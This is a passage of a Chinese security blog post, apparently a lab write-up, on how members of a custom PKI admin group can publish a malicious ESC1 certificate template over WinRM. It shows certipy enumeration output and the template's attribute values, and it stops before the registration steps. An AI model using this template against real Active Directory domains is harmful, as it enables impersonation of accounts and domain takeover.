@@ -1,0 +1,1174 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文导读\rpki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。\n当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。\n但其实这种组都是域环境自建组，域环境并不具备默认的ca管理组（除了域管），这种环境中的自建组一般只会分配证书请求颁发发布的权限，也就意味着如果当前环境并不存在恶意模板，我们就不能利用对ca的全部掌控权限打黄金证书，所以我在思考这种攻击路径时意识到，只要存在这种自建组，其实我们完全具备权限发布恶意模板并请求证书，做到自己部署可攻击环境。 这显而易见不是吗。证书服务管理组理应获得如此权限，但是当我尝试进行测试时发现，如果我们想发布恶意证书，就需要权限的同时还需要桌面交互会话，否则你无法操控证书管理certsrv.msc。所以本文的重点将放在：如何仅利用winrm会话发布并注册恶意模板并加以利用。 我查找了中外很多文章，确定这条攻击路径目前没有人发布过，所以本文将详细描述一下这种攻击所需要的权限，以及具体的攻击手法，虽然其中涉及大量powershell语法。\n恶意证书部署流程\r首先可以看一下我现在目标靶机环境\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/adcs-test] └─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Finding issuance policies [*] Found 15 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for &#39;wackadcs-DC-CA&#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [!] Failed to get CA configuration for &#39;wackadcs-DC-CA&#39; via RRP: Expected a bytes object for security descriptor, got &lt;class &#39;str&#39;&gt; [!] Use -debug to print a stacktrace [!] Could not retrieve configuration for &#39;wackadcs-DC-CA&#39; [*] Checking web enrollment for CA &#39;wackadcs-DC-CA&#39; @ &#39;dc.wackadcs.com&#39; [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : wackadcs-DC-CA DNS Name : dc.wackadcs.com Certificate Subject : CN=wackadcs-DC-CA, DC=wackadcs, DC=com Certificate Serial Number : 19F9595699CD919E41F8D2620299CFA0 Certificate Validity Start : 2025-08-28 08:34:40+00:00 Certificate Validity End : 2030-08-28 08:44:40+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Unknown Request Disposition : Unknown Enforce Encryption for Requests : Unknown Active Policy : Unknown Disabled Extensions : Unknown Certificate Templates : [!] Could not find any certificate templates 可以看到证书服务配置正常，但是没有可以利用的证书\n">
+<title>ca管理员权限解析及利用发布恶意模板攻击</title>
+
+<link rel='canonical' href='https://wackymaker.github.io/post/adcsmake/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="ca管理员权限解析及利用发布恶意模板攻击">
+<meta property='og:description' content="本文导读\rpki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。\n当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。\n但其实这种组都是域环境自建组，域环境并不具备默认的ca管理组（除了域管），这种环境中的自建组一般只会分配证书请求颁发发布的权限，也就意味着如果当前环境并不存在恶意模板，我们就不能利用对ca的全部掌控权限打黄金证书，所以我在思考这种攻击路径时意识到，只要存在这种自建组，其实我们完全具备权限发布恶意模板并请求证书，做到自己部署可攻击环境。 这显而易见不是吗。证书服务管理组理应获得如此权限，但是当我尝试进行测试时发现，如果我们想发布恶意证书，就需要权限的同时还需要桌面交互会话，否则你无法操控证书管理certsrv.msc。所以本文的重点将放在：如何仅利用winrm会话发布并注册恶意模板并加以利用。 我查找了中外很多文章，确定这条攻击路径目前没有人发布过，所以本文将详细描述一下这种攻击所需要的权限，以及具体的攻击手法，虽然其中涉及大量powershell语法。\n恶意证书部署流程\r首先可以看一下我现在目标靶机环境\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/adcs-test] └─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Finding issuance policies [*] Found 15 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for &#39;wackadcs-DC-CA&#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [!] Failed to get CA configuration for &#39;wackadcs-DC-CA&#39; via RRP: Expected a bytes object for security descriptor, got &lt;class &#39;str&#39;&gt; [!] Use -debug to print a stacktrace [!] Could not retrieve configuration for &#39;wackadcs-DC-CA&#39; [*] Checking web enrollment for CA &#39;wackadcs-DC-CA&#39; @ &#39;dc.wackadcs.com&#39; [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : wackadcs-DC-CA DNS Name : dc.wackadcs.com Certificate Subject : CN=wackadcs-DC-CA, DC=wackadcs, DC=com Certificate Serial Number : 19F9595699CD919E41F8D2620299CFA0 Certificate Validity Start : 2025-08-28 08:34:40+00:00 Certificate Validity End : 2030-08-28 08:44:40+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Unknown Request Disposition : Unknown Enforce Encryption for Requests : Unknown Active Policy : Unknown Disabled Extensions : Unknown Certificate Templates : [!] Could not find any certificate templates 可以看到证书服务配置正常，但是没有可以利用的证书\n">
+<meta property='og:url' content='https://wackymaker.github.io/post/adcsmake/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-09-03T18:42:12&#43;08:00'/><meta property='article:modified_time' content='2025-09-03T18:42:12&#43;08:00'/>
+<meta name="twitter:title" content="ca管理员权限解析及利用发布恶意模板攻击">
+<meta name="twitter:description" content="本文导读\rpki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。\n当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。\n但其实这种组都是域环境自建组，域环境并不具备默认的ca管理组（除了域管），这种环境中的自建组一般只会分配证书请求颁发发布的权限，也就意味着如果当前环境并不存在恶意模板，我们就不能利用对ca的全部掌控权限打黄金证书，所以我在思考这种攻击路径时意识到，只要存在这种自建组，其实我们完全具备权限发布恶意模板并请求证书，做到自己部署可攻击环境。 这显而易见不是吗。证书服务管理组理应获得如此权限，但是当我尝试进行测试时发现，如果我们想发布恶意证书，就需要权限的同时还需要桌面交互会话，否则你无法操控证书管理certsrv.msc。所以本文的重点将放在：如何仅利用winrm会话发布并注册恶意模板并加以利用。 我查找了中外很多文章，确定这条攻击路径目前没有人发布过，所以本文将详细描述一下这种攻击所需要的权限，以及具体的攻击手法，虽然其中涉及大量powershell语法。\n恶意证书部署流程\r首先可以看一下我现在目标靶机环境\n┌──(wackymaker㉿kali)-[~/tmp/synthetic/adcs-test] └─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Finding issuance policies [*] Found 15 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for &#39;wackadcs-DC-CA&#39; via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [!] Failed to get CA configuration for &#39;wackadcs-DC-CA&#39; via RRP: Expected a bytes object for security descriptor, got &lt;class &#39;str&#39;&gt; [!] Use -debug to print a stacktrace [!] Could not retrieve configuration for &#39;wackadcs-DC-CA&#39; [*] Checking web enrollment for CA &#39;wackadcs-DC-CA&#39; @ &#39;dc.wackadcs.com&#39; [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : wackadcs-DC-CA DNS Name : dc.wackadcs.com Certificate Subject : CN=wackadcs-DC-CA, DC=wackadcs, DC=com Certificate Serial Number : 19F9595699CD919E41F8D2620299CFA0 Certificate Validity Start : 2025-08-28 08:34:40+00:00 Certificate Validity End : 2030-08-28 08:44:40+00:00 Web Enrollment HTTP Enabled : False HTTPS Enabled : False User Specified SAN : Unknown Request Disposition : Unknown Enforce Encryption for Requests : Unknown Active Policy : Unknown Disabled Extensions : Unknown Certificate Templates : [!] Could not find any certificate templates 可以看到证书服务配置正常，但是没有可以利用的证书\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#本文导读">本文导读</a></li>
+    <li><a href="#恶意证书部署流程">恶意证书部署流程</a>
+      <ul>
+        <li><a href="#准备模板">准备模板</a></li>
+        <li><a href="#oid和应用策略">OID和应用策略</a></li>
+        <li><a href="#密钥和名称加密">密钥和名称加密</a></li>
+        <li><a href="#生命周期和有效期">生命周期和有效期</a></li>
+        <li><a href="#扩展属性">扩展属性</a></li>
+        <li><a href="#pkiadmin组权限构筑">pkiadmin组权限构筑</a></li>
+        <li><a href="#注册恶意模板">注册恶意模板</a></li>
+      </ul>
+    </li>
+    <li><a href="#快速攻击">快速攻击</a></li>
+    <li><a href="#总结">总结</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" >
+                域渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/adcsmake/">ca管理员权限解析及利用发布恶意模板攻击</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 03, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    10 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="本文导读">本文导读
+</h2><p>pki是一种公钥认证基础，用来实现证书的发布管理等，Microsof实现的PKI被称为 Active Directory证书服务（Active Directory Certificate ServicesAD CS）其在很大程度上受到安全社区的关注。</p>
+<p>当我们在域渗透的过程中，经常会见到pki admin或者Certificate Managers这些组，无论是实战环境还是渗透比赛，这都意味着我们可以枚举域内存在漏洞的证书模板并加以利用。</p>
+<p>但其实这种组都是域环境自建组，域环境并不具备默认的ca管理组（除了域管），这种环境中的自建组一般只会分配证书请求颁发发布的权限，也就意味着如果当前环境并不存在恶意模板，我们就不能利用对ca的全部掌控权限打黄金证书，所以我在思考这种攻击路径时意识到，只要存在这种自建组，其实我们完全具备权限发布恶意模板并请求证书，做到自己部署可攻击环境。
+这显而易见不是吗。证书服务管理组理应获得如此权限，但是当我尝试进行测试时发现，如果我们想发布恶意证书，就需要权限的同时还需要桌面交互会话，否则你无法操控证书管理certsrv.msc。所以本文的重点将放在：如何仅利用winrm会话发布并注册恶意模板并加以利用。
+我查找了中外很多文章，确定这条攻击路径目前没有人发布过，所以本文将详细描述一下这种攻击所需要的权限，以及具体的攻击手法，虽然其中涉及大量powershell语法。</p>
+<h2 id="恶意证书部署流程">恶意证书部署流程
+</h2><p>首先可以看一下我现在目标靶机环境</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/synthetic/adcs-test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ certipy find -u $user -p $pass -target $FQDN -dc-ip $ip -text -stdout -vulnerable
+</span></span><span style="display:flex;"><span>Certipy v5.0.3 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">34</span> certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding certificate authorities
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">1</span> certificate authority
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">12</span> enabled certificate templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Finding issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">15</span> issuance policies
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">0</span> OIDs linked to templates
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span> via RRP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to connect to remote registry. Service should be starting now. Trying again...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Failed to get CA configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span> via RRP: Expected a bytes object <span style="color:#66d9ef">for</span> security descriptor, got &lt;class <span style="color:#e6db74">&#39;str&#39;</span>&gt;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not retrieve configuration <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Checking web enrollment <span style="color:#66d9ef">for</span> CA <span style="color:#e6db74">&#39;wackadcs-DC-CA&#39;</span> @ <span style="color:#e6db74">&#39;dc.wackadcs.com&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Error checking web enrollment: timed out
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Use -debug to print a stacktrace
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Enumeration output:
+</span></span><span style="display:flex;"><span>Certificate Authorities
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    CA Name                             : wackadcs-DC-CA
+</span></span><span style="display:flex;"><span>    DNS Name                            : dc.wackadcs.com
+</span></span><span style="display:flex;"><span>    Certificate Subject                 : CN<span style="color:#f92672">=</span>wackadcs-DC-CA, DC<span style="color:#f92672">=</span>wackadcs, DC<span style="color:#f92672">=</span>com
+</span></span><span style="display:flex;"><span>    Certificate Serial Number           : 19F9595699CD919E41F8D2620299CFA0
+</span></span><span style="display:flex;"><span>    Certificate Validity Start          : 2025-08-28 08:34:40+00:00
+</span></span><span style="display:flex;"><span>    Certificate Validity End            : 2030-08-28 08:44:40+00:00
+</span></span><span style="display:flex;"><span>    Web Enrollment
+</span></span><span style="display:flex;"><span>      HTTP
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>      HTTPS
+</span></span><span style="display:flex;"><span>        Enabled                         : False
+</span></span><span style="display:flex;"><span>    User Specified SAN                  : Unknown
+</span></span><span style="display:flex;"><span>    Request Disposition                 : Unknown
+</span></span><span style="display:flex;"><span>    Enforce Encryption <span style="color:#66d9ef">for</span> Requests     : Unknown
+</span></span><span style="display:flex;"><span>    Active Policy                       : Unknown
+</span></span><span style="display:flex;"><span>    Disabled Extensions                 : Unknown
+</span></span><span style="display:flex;"><span>Certificate Templates                   : <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Could not find any certificate templates
+</span></span></code></pre></div><p>可以看到证书服务配置正常，但是没有可以利用的证书</p>
+<p>为了部署恶意证书我们能从<a class="link" href="https://learn.microsoft.com/en-us/intune/intune-service/protect/microsoft-cloud-pki-fundamentals"  target="_blank" rel="noopener"
+    >微软</a>的pki文档中了解证书发布的流程</p>
+<p>首先我们需要准备一个恶意证书模板，我的目光首先放在了esc1模板上，这是一种在adcs中最易于攻击的模板，而<a class="link" href="https://learn.microsoft.com/en-us/powershell/module/pki/new-selfsignedcertificate?view=windowsserver2025-ps"  target="_blank" rel="noopener"
+    >微软的自签名模板</a>以及一个证书模板需要如下5块信息</p>
+<h3 id="准备模板">准备模板
+</h3><p>基本信息中我们需要定义模板的名称以及类型标志版本，我简单配置如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>name	<span style="color:#e6db74">&#34;ESC1&#34;</span>	<span style="color:#75715e">#AD中对象的内部名字（用于引用）</span>
+</span></span><span style="display:flex;"><span>displayName	<span style="color:#e6db74">&#34;ESC1&#34;</span>	<span style="color:#75715e">#CA界面显示名称</span>
+</span></span><span style="display:flex;"><span>objectClass	<span style="color:#e6db74">&#34;pKICertificateTemplate&#34;</span>	<span style="color:#75715e">#LDAP对象类型，表示这是一个证书模板</span>
+</span></span><span style="display:flex;"><span>flags	131616	<span style="color:#75715e">#模板标志，控制模板行为（如允许导出私钥、自动注册等）</span>
+</span></span><span style="display:flex;"><span>revision	100	<span style="color:#75715e">#模板版本号，增加后表示模板有更新</span>
+</span></span></code></pre></div><h3 id="oid和应用策略">OID和应用策略
+</h3><p>oid是对象标识符，可以理解为一个全局唯一的标识信息，主要是msPKI-Certificate-Application-Policy属性中的值1.3.6.1.5.5.7.3.2代表了允许客户端验证</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msPKI-Cert-Template-OID	<span style="color:#e6db74">&#34;1.3.6.1.4.1.311.21.8.16735922.7437492.10570883.2539024.15756463.185.9025784.11813639&#34;</span>,	<span style="color:#75715e">#模板的唯一标识符，用于 CA 识别模板</span>
+</span></span><span style="display:flex;"><span>msPKI-Certificate-Application-Policy	<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;1.3.6.1.5.5.7.3.2&#34;</span><span style="color:#f92672">]</span>	<span style="color:#75715e">#证书用途（EKU），这里 1.3.6.1.5.5.7.3.2 表示 客户端身份认证</span>
+</span></span><span style="display:flex;"><span>msPKI-Certificate-Name-Flag	1	<span style="color:#75715e">#控制 CN 名称如何生成（1 通常表示使用用户的主体名称）</span>
+</span></span></code></pre></div><h3 id="密钥和名称加密">密钥和名称加密
+</h3><p>这一段是和正常模板一致的，可以随便导出一张证书复制过来或者ai生成</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>msPKI-Minimal-Key-Size	2048	<span style="color:#75715e">#证书最小密钥长度</span>
+</span></span><span style="display:flex;"><span>msPKI-Private-Key-Flag	16842752	<span style="color:#75715e">#控制私钥属性（可导出、可签名、可加密等）</span>
+</span></span><span style="display:flex;"><span>pKIDefaultCSPs	<span style="color:#e6db74">&#34;3,Microsoft Base DSS Cryptographic Provider&#34;</span>,<span style="color:#e6db74">&#34;2,Microsoft Base Cryptographic Provider v1.0&#34;</span>,<span style="color:#e6db74">&#34;1,Microsoft Enhanced Cryptographic Provider v1.0&#34;</span>	<span style="color:#75715e">#默认使用的加密服务提供者（CSP）</span>
+</span></span><span style="display:flex;"><span>pKIDefaultKeySpec	2	<span style="color:#75715e">#默认密钥用途（签名=1，加密=2，这里是加密）</span>
+</span></span></code></pre></div><h3 id="生命周期和有效期">生命周期和有效期
+</h3><p>同上，找模板复制即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pKIExpirationPeriod	<span style="color:#f92672">[</span>0,64,57,135,46,225,254,255<span style="color:#f92672">]</span>	<span style="color:#75715e">#证书有效期，二进制编码表示</span>
+</span></span><span style="display:flex;"><span>pKIOverlapPeriod	<span style="color:#f92672">[</span>0,128,166,10,255,222,255,255<span style="color:#f92672">]</span>	<span style="color:#75715e">#证书续订重叠期，二进制表示</span>
+</span></span><span style="display:flex;"><span>pKIMaxIssuingDepth	0	<span style="color:#75715e">#最大颁发深度（0 = 无限</span>
+</span></span></code></pre></div><h3 id="扩展属性">扩展属性
+</h3><p>这段需要包含证书的关键扩展（Key Usage, Basic Constraints），以及重复指定pKIExtendedKeyUsage参数[&ldquo;1.3.6.1.5.5.7.3.2&rdquo;]表示此模板为客户端认证用途</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>pKICriticalExtensions	<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;2.5.29.15&#34;</span>,<span style="color:#e6db74">&#34;2.5.29.7&#34;</span><span style="color:#f92672">]</span>	<span style="color:#75715e">#证书的关键扩展（Key Usage, Basic Constraints）</span>
